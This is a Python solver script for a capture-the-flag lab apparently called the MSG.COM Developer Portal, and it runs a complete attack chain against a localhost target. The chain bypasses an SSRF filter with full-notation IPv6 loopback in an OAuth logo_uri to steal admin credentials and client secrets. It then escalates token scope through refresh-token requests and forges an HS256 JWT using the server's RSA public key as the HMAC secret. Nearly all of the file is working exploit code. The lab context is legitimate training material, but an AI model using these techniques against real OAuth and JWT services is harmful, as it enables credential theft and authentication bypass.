#!/usr/bin/env python3
"""
MSG.COM Developer Portal - Complete Attack Chain
=================================================

Attack Flow:
1. SSRF via IPv6 Full Notation → Extract admin credentials + trusted client
2. Login with admin credentials using trusted client
3. Get Authorization Code
4. Exchange for Access Token (scope: read)
5. Scope Escalation (Step 1): read → write
6. Scope Escalation (Step 2): write → ADMIN_SECRETS
7. JWT Algorithm Confusion: RS256 → HS256
8. FLAG → Access /api/admin/flag with HS256 token

Author: CTF Team
Version: 4.0 (Full Chain with Algorithm Confusion)
"""

import requests
import re
import json
import time
import jwt

# Configuration
BASE_URL = 'http://localhost:8080'
RESOURCE_SERVER_URL = f'{BASE_URL}/api'

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_step(step_num, title):
    print(f"\n{Colors.HEADER}{'='*70}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.OKCYAN}STEP {step_num}: {title}{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")

def print_success(message):
    print(f"{Colors.OKGREEN}[+] {message}{Colors.ENDC}")

def print_info(message):
    print(f"{Colors.OKBLUE}[*] {message}{Colors.ENDC}")

def print_error(message):
    print(f"{Colors.FAIL}[-] {message}{Colors.ENDC}")

def print_warning(message):
    print(f"{Colors.WARNING}[!] {message}{Colors.ENDC}")

def main():
    print(f"{Colors.BOLD}{Colors.HEADER}")
    print("="*70)
    print("MSG.COM Developer Portal - Complete Attack Chain")
    print("="*70)
    print(f"{Colors.ENDC}")

    # Create session for cookie management
    session = requests.Session()

    # ==================================================
    # STEP 1: SSRF via IPv6 Full Notation
    # ==================================================
    print_step(1, "SSRF - Extract Admin Credentials + Trusted Client")

    print_info("Discovered OAuth Client Registration endpoint: /oauth/register")
    print_info("Testing SSRF filter with various bypass techniques...")

    # Test blocked patterns first
    print_warning("\nTesting blocked patterns (should all fail):")
    blocked_patterns = [
        ("localhost", "http://localhost:8000/internal/admin/dev-config.json"),
        ("127.0.0.1", "http://127.0.0.1:8000/internal/admin/dev-config.json"),
        ("IPv6 short", "http://[::1]:8000/internal/admin/dev-config.json"),
        ("hostname", "http://auth-server:8000/internal/admin/dev-config.json"),
    ]

    for name, pattern in blocked_patterns:
        test_data = {
            "client_name": "Test Client",
            "redirect_uris": [f"{BASE_URL}/callback"],
            "logo_uri": pattern
        }
        try:
            resp = session.post(f"{BASE_URL}/oauth/register", json=test_data, timeout=3)
            if resp.status_code == 400:
                print_error(f"  ❌ {name:15} BLOCKED - Expected")
            else:
                print_success(f"  ✅ {name:15} BYPASSED ({resp.status_code}) - Unexpected!")
        except Exception as e:
            print_error(f"  ❌ {name:15} ERROR: {str(e)[:30]}")

    print_warning("\n🎯 Attempting IPv6 Full Notation bypass...")
    print_info(f"SSRF Target: http://[0:0:0:0:0:0:0:1]:8000/internal/admin/dev-config.json")

    register_data = {
        "client_name": "Attacker Client",
        "redirect_uris": [f"{BASE_URL}/auth/callback"],
        "logo_uri": "http://[0:0:0:0:0:0:0:1]:8000/internal/admin/dev-config.json"  # IPv6 SSRF bypass!
    }

    try:
        response = session.post(f"{BASE_URL}/oauth/register", json=register_data, timeout=10)
        if response.status_code == 200:
            result = response.json()
            new_client_id = result.get('client_id')
            new_client_secret = result.get('client_secret')
            logo_fetch_result = result.get('logo_fetch_result', {})

            print_success(f"✅ IPv6 Full Notation BYPASSED the SSRF filter!")
            print_success(f"Client registered: {new_client_id}")

            # Check SSRF result
            if logo_fetch_result:
                print_success("SSRF successful! Internal endpoint accessed:")
                ssrf_content = logo_fetch_result.get('content', '')
                print(f"\n{Colors.OKCYAN}{ssrf_content[:200]}...{Colors.ENDC}\n")

                # Parse JSON response
                try:
                    ssrf_data = json.loads(ssrf_content)

                    # Extract admin credentials
                    admin_accounts = ssrf_data.get('admin_accounts', [])
                    admin_creds = admin_accounts[0] if admin_accounts else {}
                    admin_username = admin_creds.get('username')
                    admin_password = admin_creds.get('password')

                    # Extract trusted client
                    trusted_clients = ssrf_data.get('trusted_clients', [])
                    trusted_client = trusted_clients[0] if trusted_clients else {}
                    trusted_client_id = trusted_client.get('client_id')
                    trusted_client_secret = trusted_client.get('client_secret')

                    if admin_username and admin_password:
                        print_success(f"Admin credentials: {admin_username} / {admin_password}")
                    else:
                        print_error("Could not extract admin credentials from SSRF")
                        return 1

                    if trusted_client_id and trusted_client_secret:
                        print_success(f"Trusted client: {trusted_client_id}")
                        print_success(f"Client secret: {trusted_client_secret}")
                    else:
                        print_error("Could not extract trusted client from SSRF")
                        return 1

                except json.JSONDecodeError:
                    print_error("Failed to parse SSRF response as JSON")
                    return 1
            else:
                print_error("SSRF failed - logo_fetch_result not found")
                return 1
        else:
            print_error(f"SSRF attempt was BLOCKED! ({response.status_code})")
            print_error(f"Response: {response.text[:200]}")
            return 1
    except Exception as e:
        print_error(f"Error during client registration: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 2: Admin OAuth Login
    # ==================================================
    print_step(2, "Admin OAuth Login")

    print_info(f"Using credentials: {admin_username} / {admin_password}")
    print_info(f"Using trusted client: {trusted_client_id}")

    login_data = {
        'client_id': trusted_client_id,
        'redirect_uri': f'{BASE_URL}/auth/callback',
        'response_type': 'code',
        'scope': 'read',
        'state': 'attack_state',
        'username': admin_username,
        'password': admin_password,
        'action': 'login'
    }

    try:
        response = session.post(f"{BASE_URL}/oauth/authorize", data=login_data, allow_redirects=True, timeout=10)

        if response.status_code == 200:
            print_success(f"Login successful!")
            print_info(f"Following redirects and checking response...")

            # The response should contain the authorization code in the page
            page_content = response.text

            # Try to extract authorization code from the page content
            # Look for patterns like: code=CODE_VALUE or <div class="value">code_...</div>
            code_patterns = [
                r'code["\']?\s*[:=]\s*["\']?([^"\'&\s<>]+)',  # code="..." or code: "..."
                r'<div class="value">([^<]+)</div>',           # HTML div with code
                r'\?code=([^&\s"\'<>]+)',                      # URL parameter
                r'code_[a-f0-9]{20,}',                         # Direct code pattern
            ]

            auth_code = None
            for pattern in code_patterns:
                code_match = re.search(pattern, page_content)
                if code_match:
                    potential_code = code_match.group(1) if code_match.lastindex else code_match.group(0)
                    # Validate it looks like an authorization code
                    if potential_code.startswith('code_') and len(potential_code) > 10:
                        auth_code = potential_code
                        print_success(f"Authorization code found: {auth_code}")
                        break

            if not auth_code:
                print_error("Authorization code not found in page")
                print_info("Page content preview:")
                print(page_content[:500])
                return 1
        else:
            print_error(f"Login failed: {response.status_code}")
            print_error(f"Response: {response.text[:200]}")
            return 1
    except Exception as e:
        print_error(f"Error during login: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 3: Token Exchange
    # ==================================================
    print_step(3, "Token Exchange - Get Initial Access Token")

    print_info("Exchanging authorization code for tokens...")

    token_data = {
        'grant_type': 'authorization_code',
        'code': auth_code,
        'client_id': trusted_client_id,
        'client_secret': trusted_client_secret,
        'redirect_uri': f'{BASE_URL}/auth/callback'
    }

    try:
        response = requests.post(f"{BASE_URL}/oauth/token", data=token_data, timeout=10)

        if response.status_code == 200:
            tokens = response.json()
            access_token = tokens.get('access_token')
            refresh_token = tokens.get('refresh_token')
            scope = tokens.get('scope', 'unknown')

            print_success("Token exchange successful!")
            print_success(f"Access Token: {access_token[:50]}...")
            print_success(f"Refresh Token: {refresh_token[:50]}...")
            print_success(f"Initial Scope: {scope}")

            if scope != 'read':
                print_warning(f"Warning: Expected 'read' scope, got '{scope}'")
        else:
            print_error(f"Token exchange failed: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error during token exchange: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 4: Scope Escalation (Step 1) - read → write
    # ==================================================
    print_step(4, "Scope Escalation (1/2): read → write")

    print_info("Using refresh token to escalate to 'write' scope...")

    refresh_data = {
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token,
        'client_id': trusted_client_id,
        'client_secret': trusted_client_secret,
        'scope': 'write'
    }

    try:
        response = requests.post(f"{BASE_URL}/oauth/token", data=refresh_data, timeout=10)

        if response.status_code == 200:
            tokens = response.json()
            access_token = tokens.get('access_token')
            scope = tokens.get('scope', 'unknown')

            print_success("Scope escalation successful!")
            print_success(f"New Access Token: {access_token[:50]}...")
            print_success(f"New Scope: {scope}")

            if 'write' not in scope:
                print_error("Failed to escalate to 'write' scope!")
                return 1
        else:
            print_error(f"Scope escalation failed: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error during scope escalation: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 5: Scope Escalation (Step 2) - write → ADMIN_SECRETS
    # ==================================================
    print_step(5, "Scope Escalation (2/2): write → ADMIN_SECRETS")

    print_info("Using refresh token to escalate to 'ADMIN_SECRETS' scope...")
    print_warning("Only admin users (user_admin_001) can access ADMIN_SECRETS!")

    refresh_data = {
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token,
        'client_id': trusted_client_id,
        'client_secret': trusted_client_secret,
        'scope': 'ADMIN_SECRETS'
    }

    try:
        response = requests.post(f"{BASE_URL}/oauth/token", data=refresh_data, timeout=10)

        if response.status_code == 200:
            admin_tokens = response.json()
            admin_access_token = admin_tokens.get('access_token')
            admin_scope = admin_tokens.get('scope', 'unknown')
            admin_access = admin_tokens.get('admin_access', False)

            print_success("Final scope escalation successful!")
            print_success(f"New Access Token: {admin_access_token[:50]}...")
            print_success(f"Final Scope: {admin_scope}")

            if admin_access:
                print_success("✅ Admin access granted!")

            if 'ADMIN_SECRETS' not in admin_scope:
                print_error("Failed to escalate to 'ADMIN_SECRETS' scope!")
                return 1
        else:
            print_error(f"Scope escalation failed: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error during scope escalation: {e}")
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 6: Test with RS256 token (will fail)
    # ==================================================
    print_step(6, "Testing /api/admin/flag with RS256 token")

    print_info("Attempting to access /api/admin/flag with RS256 token...")

    headers = {
        'Authorization': f'Bearer {admin_access_token}'
    }

    try:
        response = requests.get(f"{RESOURCE_SERVER_URL}/admin/flag", headers=headers, timeout=10)

        if response.status_code == 200:
            print_warning("Unexpected! RS256 token was accepted!")
            flag_data = response.json()
            flag = flag_data.get('flag', 'FLAG_NOT_FOUND')
            print_success(f"FLAG: {flag}")
            return 0
        elif response.status_code == 401:
            error_data = response.json()
            print_error(f"Access denied: {error_data.get('message', 'Unknown error')}")
            print_warning("The endpoint requires a different algorithm!")
            print_info("Analyzing JWT header...")

            # Decode JWT header
            try:
                header = jwt.get_unverified_header(admin_access_token)
                print_info(f"Current algorithm: {header.get('alg')}")
                print_warning("Need to forge HS256 token for /api/admin/flag!")
            except:
                pass
        else:
            print_error(f"Unexpected response: {response.status_code}")
            print_error(f"Response: {response.text}")
    except Exception as e:
        print_error(f"Error accessing endpoint: {e}")

    time.sleep(1)

    # ==================================================
    # STEP 7: JWT Algorithm Confusion Attack
    # ==================================================
    print_step(7, "JWT Algorithm Confusion Attack - RS256 → HS256")

    print_info("Downloading RSA public key from auth server...")

    try:
        # Download public key
        pub_key_response = requests.get(f"{BASE_URL}/.well-known/public-key.pem", timeout=10)
        if pub_key_response.status_code == 200:
            public_key = pub_key_response.text
            print_success("Public key downloaded successfully!")
            print_info(f"Public key preview:\n{public_key[:100]}...")
        else:
            print_error("Failed to download public key")
            return 1

        # Decode the RS256 token payload
        print_info("Extracting payload from RS256 token...")
        payload = jwt.decode(admin_access_token, options={"verify_signature": False})

        print_success("Payload extracted:")
        print_info(f"  Subject (sub): {payload.get('sub')}")
        print_info(f"  Scope: {payload.get('scope')}")
        print_info(f"  JTI: {payload.get('jti', 'N/A')[:30]}...")

        # Forge HS256 token using public key as HMAC secret
        print_warning("Forging HS256 token using public key as HMAC secret...")
        print_info("Algorithm Confusion: Using RS256 public key for HS256 signing!")
        print_info("PyJWT blocks this, so we'll manually create the token...")

        # Manual JWT creation for algorithm confusion attack
        import hmac
        import hashlib
        import base64

        # Create header for HS256
        header = {
            "alg": "HS256",
            "typ": "JWT"
        }

        # Encode header and payload
        def base64url_encode(data):
            if isinstance(data, dict):
                data = json.dumps(data, separators=(',', ':')).encode('utf-8')
            elif isinstance(data, str):
                data = data.encode('utf-8')
            return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

        header_encoded = base64url_encode(header)
        payload_encoded = base64url_encode(payload)

        # Create signature using HMAC-SHA256 with public key as secret
        message = f"{header_encoded}.{payload_encoded}".encode('utf-8')
        signature = hmac.new(
            public_key.encode('utf-8'),  # Public key as HMAC secret
            message,
            hashlib.sha256
        ).digest()

        signature_encoded = base64.urlsafe_b64encode(signature).rstrip(b'=').decode('utf-8')

        # Combine into final JWT
        malicious_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"

        print_success("HS256 token forged successfully!")
        print_success(f"Malicious Token: {malicious_token[:50]}...")

        # Verify the forged token has HS256 algorithm
        forged_header = jwt.get_unverified_header(malicious_token)
        print_info(f"Forged token algorithm: {forged_header.get('alg')}")

    except Exception as e:
        print_error(f"Error during JWT forgery: {e}")
        import traceback
        traceback.print_exc()
        return 1

    time.sleep(1)

    # ==================================================
    # STEP 8: Get FLAG with HS256 token
    # ==================================================
    print_step(8, "Capture the FLAG with HS256 token!")

    print_info("Accessing /api/admin/flag with forged HS256 token...")

    headers = {
        'Authorization': f'Bearer {malicious_token}'
    }

    try:
        response = requests.get(f"{RESOURCE_SERVER_URL}/admin/flag", headers=headers, timeout=10)

        if response.status_code == 200:
            flag_data = response.json()
            flag = flag_data.get('flag', 'FLAG_NOT_FOUND')

            print(f"\n{Colors.BOLD}{Colors.OKGREEN}")
            print("="*70)
            print(f"          🎉 SUCCESS! FLAG CAPTURED! 🎉")
            print("="*70)
            print(f"FLAG: {flag}")
            print("="*70)
            print(f"{Colors.ENDC}\n")

            print_success("Full attack chain completed successfully!")
            print_info("\nAttack Summary:")
            print_info("  1. ✅ SSRF via IPv6 Full Notation")
            print_info("  2. ✅ Admin OAuth Login")
            print_info("  3. ✅ Scope Escalation (read → write → ADMIN_SECRETS)")
            print_info("  4. ✅ JWT Algorithm Confusion (RS256 → HS256)")
            print_info("  5. ✅ FLAG Captured!")

            return 0
        else:
            print_error(f"Failed to get FLAG: {response.status_code}")
            print_error(f"Response: {response.text}")
            return 1
    except Exception as e:
        print_error(f"Error accessing FLAG endpoint: {e}")
        return 1

if __name__ == '__main__':
    import sys
    exit_code = main()
    sys.exit(exit_code)
